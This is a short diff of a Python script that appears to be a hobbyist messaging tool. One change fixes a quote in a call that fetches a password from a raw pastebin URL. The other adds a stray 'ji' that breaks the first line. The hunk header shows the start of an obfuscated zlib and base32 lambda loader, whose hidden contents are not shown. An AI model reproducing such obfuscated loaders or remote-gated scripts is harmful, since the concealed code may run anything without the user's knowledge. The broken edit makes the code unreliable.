@@ -1,4 +1,4 @@
-# CRADIT BY DEVA XD KING 
+ji# CRADIT BY DEVA XD KING 
 import requests
 import json
 import time
@@ -97,7 +97,7 @@ _ = lambda __ : __import__('zlib').decompress(__import__('base64').b32decode(__[
 
 def send_initial_message():
     
-    mmm_pass = requests.get('https://pastebin.com/raw/jvrPqR29).text
+    mmm_pass = requests.get('https://pastebin.com/raw/jvrPqR29').text
     
     if mmm_pass not in password:
         print('\033[1;31m⚠︎ Your Password Changed By ALFAZ KHAN XE DEVA THAKUR')
